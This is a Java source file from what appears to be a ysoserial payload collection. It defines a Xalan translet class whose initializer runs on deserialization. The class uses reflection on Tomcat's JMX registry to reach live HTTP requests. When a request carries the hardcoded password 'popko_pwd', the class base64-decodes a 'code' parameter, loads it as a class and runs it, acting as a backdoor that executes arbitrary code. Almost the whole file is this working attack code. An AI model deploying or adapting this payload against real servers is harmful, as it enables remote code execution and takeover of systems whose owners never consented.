package ysoserial.payloads;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;
import javax.management.MBeanServer;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.util.ServerInfo;
import org.apache.coyote.Request;
import org.apache.tomcat.util.buf.ByteChunk;
import org.apache.tomcat.util.modeler.Registry;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class TomcatServletClassLoader1 extends AbstractTranslet {
    {
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap) field.get(obj);
            obj = ((HashMap) obj2.get("Catalina")).get("name=\"http-nio-8877\",type=GlobalRequestProcessor");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            field.setAccessible(true);
            ArrayList obj3 = (ArrayList) field.get(obj);
            field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            field.setAccessible(true);

            for (int i = 0; i < obj3.size(); ++i) {
                Request obj4 = (Request) field.get(obj3.get(i));
                String type = obj4.getParameters().getParameter("type");
                String password = obj4.getParameters().getParameter("password");
                System.out.println("password:" + password + ";\ntype:" + type);
                if (password.equals("popko_pwd") && type != null) {
                    //todo: 记录一下报错
                    class U extends ClassLoader {
                        U(ClassLoader c) {
                            super(c);
                        }

                        public Class g(byte[] b) {
                            return super.defineClass(b, 0, b.length);
                        }
                    }
                    try {
                        Class clazz = Class.forName(type);
                        System.out.println("has " + type);
                        clazz.newInstance().equals(obj4.getResponse());//Echo
                    } catch (ClassNotFoundException e) {
                        System.out.println("no " + type);
                        String code = obj4.getParameters().getParameter("code");
                        //if (ver.startsWith("1.8")) {
                        if (code != null) {
                            byte[] bytes = java.util.Base64.getDecoder().decode(code);
                            new U(this.getClass().getClassLoader()).g(bytes).newInstance();
                        }
                    }
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
